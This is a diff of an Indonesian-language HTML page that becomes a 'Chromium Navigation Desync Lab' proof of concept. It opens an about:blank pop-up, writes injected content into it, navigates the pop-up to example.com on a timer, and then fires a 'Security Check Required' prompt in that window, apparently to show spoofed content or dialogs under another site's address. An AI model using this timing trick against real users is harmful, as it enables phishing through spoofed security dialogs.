@@ -2,129 +2,104 @@
 <html lang="id">
 <head>
     <meta charset="utf-8">
-    <title>Android Chromium Advanced Lab Framework</title>
+    <title>Chromium Navigation Desync Lab</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
-            background-color: #090d16;
-            color: #e2e8f0;
+            background-color: #0f172a;
+            color: #f8fafc;
             font-family: system-ui, -apple-system, sans-serif;
             text-align: center;
-            padding: 30px 15px;
-            margin: 0;
+            padding: 50px 20px;
         }
-        .container {
-            background: #111827;
-            padding: 25px;
+        .box {
+            background: #1e293b;
+            padding: 30px;
             border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-            max-width: 450px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+            max-width: 400px;
             margin: 0 auto;
-            border: 1px solid #1f2937;
-        }
-        h2 {
-            font-size: 1.15rem;
-            margin-bottom: 8px;
-            color: #38bdf8;
-        }
-        p {
-            font-size: 0.85rem;
-            color: #9ca3af;
-            margin-bottom: 20px;
-        }
-        .btn-group {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
+            border: 1px: #334155;
         }
         button {
-            background-color: #2563eb;
+            background-color: #ef4444;
             color: white;
             border: none;
-            padding: 12px;
-            font-size: 0.9rem;
-            font-weight: 600;
-            border-radius: 6px;
+            padding: 14px 20px;
+            font-size: 1rem;
+            font-weight: bold;
+            border-radius: 8px;
             cursor: pointer;
-            flex: 1;
-            transition: background 0.2s;
+            width: 100%;
+            margin-top: 15px;
         }
         button:active {
-            background-color: #1d4ed8;
+            background-color: #dc2626;
         }
-        button.secondary {
-            background-color: #374151;
-        }
-        button.secondary:active {
-            background-color: #4b5563;
-        }
-        .console-log {
-            background: #030712;
-            border: 1px: #374151;
-            border-radius: 6px;
-            padding: 10px;
-            font-family: monospace;
-            font-size: 0.75rem;
-            color: #34d399;
-            text-align: left;
-            height: 120px;
-            overflow-y: auto;
+        .log {
             margin-top: 15px;
+            font-size: 0.8rem;
+            color: #94a3b8;
+            font-family: monospace;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2>Advanced Engine Stress Lab</h2>
-        <p>Simulasi kontensi Main Thread & Navigasi Asinkron Lokal.</p>
-        
-        <div class="btn-group">
-            <button id="startTest">JALANKAN STRESS</button>
-            <button id="resetTest" class="secondary">RESET</button>
-        </div>
-
-        <div id="consoleLog" class="console-log">[System] Siap menginisialisasi kerangka uji...</div>
+    <div class="box">
+        <h2>Lab Simulasi Desync</h2>
+        <p>Uji coba injeksi about:blank dan navigasi tertunda.</p>
+        <button id="trigger">JALANKAN POC</button>
+        <div id="log" class="log">Status: Menunggu aksi...</div>
     </div>
 
-    <!-- Target Iframe Lokal untuk Isolasi Pengujian -->
-    <iframe id="testFrame" style="display:none;" src="about:blank"></iframe>
-
     <script>
-        const logEl = document.getElementById('consoleLog');
+        document.getElementById('trigger').addEventListener('click', function() {
+            const logEl = document.getElementById('log');
+            logEl.innerText = "Status: Membuka jendela baru...";
 
-        function logMessage(msg) {
-            const timestamp = new Date().toLocaleTimeString();
-            logEl.innerHTML += `[${timestamp}] ${msg}<br>`;
-            logEl.scrollTop = logEl.scrollHeight;
-        }
+            // 1. Membuka jendela baru dengan konteks kosong (about:blank)
+            let newWindow = window.open('about:blank', '_blank');
 
-        document.getElementById('startTest').addEventListener('click', function() {
-            logMessage("Memulai urutan pengujian siklus asinkron...");
+            if (!newWindow) {
+                logEl.innerText = "Status Gagal: Pop-up diblokir oleh browser.";
+                return;
+            }
 
             try {
-                // 1. Manipulasi History API Cepat
-                history.pushState({ testId: 1 }, "State A", "#lab-stage-1");
-                logMessage("History state [1] disuntikkan.");
+                // 2. Menyuntikkan konten kustom (Hallo) ke dalam dokumen baru
+                newWindow.document.open();
+                newWindow.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head><title>Injected View</title></head>
+                    <body style="background:white; color:black; text-align:center; padding-top:50px; font-family:sans-serif;">
+                        <h1>Hallo</h1>
+                        <p>Konten uji coba terinjeksi pada about:blank</p>
+                    </body>
+                    </html>
+                `);
+                newWindow.document.close();
+                logEl.innerText = "Status: Konten 'Hallo' berhasil ditulis.";
 
-                // 2. Persiapan Blob Konten Lokal
-                const mockContent = `<!DOCTYPE html><html><body style="background:#fff;color:#000;text-align:center;padding-top:40px;"><h3>Sub-Konteks Aktif</h3></body></html>`;
-                const blob = new Blob([mockContent], { type: 'text/html' });
-                const blobUrl = URL.createObjectURL(blob);
-
-                // 3. Pemicuan Navigasi Berkelanjutan dengan Jeda Mikro
+                // 3. Memicu navigasi asinkron tertunda ke target (misal: example.com)
                 setTimeout(() => {
-                    logMessage("Memicu penggantian lokasi ke Blob URL...");
-                    window.location.replace(blobUrl);
-                }, 200);
+                    logEl.innerText = "Status: Memicu navigasi ke target...";
+                    newWindow.location.href = "https://example.com";
+                }, 300);
+
+                // 4. Percobaan pemanggilan dialog modal untuk menguji respons thread
+                setTimeout(() => {
+                    try {
+                        newWindow.prompt("Security Check Required", "Session Lock");
+                    } catch (e) {
+                        console.log("Modal dibatasi/diblokir oleh kebijakan keamanan.");
+                    }
+                }, 600);
 
             } catch (err) {
-                logMessage("Error terdeteksi: " + err.message);
+                logEl.innerText = "Status Error: " + err.message;
             }
-        });
-
-        document.getElementById('resetTest').addEventListener('click', function() {
-            window.location.reload();
         });
     </script>
 
